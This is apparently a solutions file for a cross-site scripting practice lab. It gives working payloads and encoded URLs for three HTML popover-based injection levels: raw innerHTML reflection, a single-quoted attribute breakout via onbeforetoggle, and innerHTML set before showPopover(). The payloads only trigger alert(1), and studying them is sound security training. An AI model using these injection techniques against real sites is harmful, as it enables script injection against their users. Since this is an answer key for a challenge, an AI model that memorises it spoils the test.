# popover — solutions

HTML popover API sinks (innerHTML/showPopover/attribute breakouts).

### popover-level1

`/popover/level1/?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: raw reflection inside <div id=p popover>QUERY</div>

### popover-level2

`/popover/level2/?query=x%27%20onbeforetoggle%3Dalert(1)%20y%3D%27`

- payload: `x' onbeforetoggle=alert(1) y='`
- context: <div popover='auto' id='QUERY' ...> single-quoted attr breakout (only < > encoded)

### popover-level3

`/popover/level3/?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: p.innerHTML = QUERY.to_json string then showPopover()
